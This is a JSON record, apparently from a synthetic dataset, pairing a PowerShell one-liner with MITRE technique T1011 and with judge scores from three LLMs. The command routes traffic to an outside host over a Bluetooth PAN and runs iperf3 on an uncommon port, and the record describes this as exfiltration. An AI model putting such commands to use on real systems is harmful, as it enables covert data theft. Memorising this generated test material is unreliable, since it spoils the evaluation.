{
  "technique_id": "T1011",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "$route='172.31.199.2'; $bt=Get-NetAdapter -Name 'Bluetooth Network Connection' -ErrorAction Stop; $gw=(Get-NetIPConfiguration -InterfaceIndex $bt.ifIndex).IPv4DefaultGateway.NextHop; if($gw){cmd /c \"route add $route mask 255.255.255.255 $gw metric 5 if $($bt.ifIndex)\"}; $lip=(Get-NetIPAddress -InterfaceIndex $bt.ifIndex -AddressFamily IPv4).IPAddress; iperf3.exe -c $route -p 55777 -B $lip -t 60",
  "explanation": "Adds a host route via the Bluetooth PAN gateway to force traffic over the Bluetooth medium, then runs iperf3 bound to that interface to exfiltrate over TCP on an uncommon port (T1011).",
  "rationale_steps": [
    "Determine Bluetooth PAN interface and its default gateway.",
    "Add a specific host route so only the exfil server traffic uses Bluetooth.",
    "Bind iperf3 to the Bluetooth address and use a high TCP port.",
    "Limit impact by scoping the route to a single destination."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1011-225e09bc-9a2e4ef2",
  "source_prompt_hash": "225e09bc",
  "timestamp_utc": "2025-09-30T08:51:08.571954Z",
  "validation": {
    "syntax_ok": true,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "PowerShell statement is well-formed with balanced quotes/parentheses, valid separators, and correct parameter/variable expansions for cmd, route, and iperf3.",
        "semantic_score": 4,
        "semantic_justification": "It appropriately attempts to force traffic over the Bluetooth PAN via a host route and binds iperf3 to that interface (aligning with T1011), but adding the route generally requires elevation and iperf3 does not exfiltrate actual target data, which may limit achieving the stated intent in practice.",
        "combined_score": 4.5,
        "confidence": 0.8,
        "timestamp": "2025-10-01T01:25:51.538948Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced quotes/parentheses, correct variable assignments, error handling with -ErrorAction, proper command separators, and valid parameter flags for all cmdlets used.",
        "semantic_score": 5,
        "semantic_justification": "The command perfectly aligns with T1011 by identifying a Bluetooth adapter, configuring a specific route to force traffic over that medium, and then using iperf3 to exfiltrate data over that alternative network channel on an uncommon port.",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-01T01:25:54.813523Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed, using correct Powershell syntax for variable assignments, cmdlet calls, conditional logic, and embedded expressions within double-quoted strings for the invoked external commands.",
        "semantic_score": 2,
        "semantic_justification": "The command's primary semantic claim of 'Adds a host route' is invalid because the `route add` command requires administrative privileges, which contradicts the specified 'Privilege: None' and prevents the intended routing mechanism from being established.",
        "combined_score": 3.5,
        "confidence": 1,
        "timestamp": "2025-10-01T06:31:02.955989Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 3.667,
    "llm_average_score": 4.333,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null,
    "Syntax_Run_Details": ""
  }
}
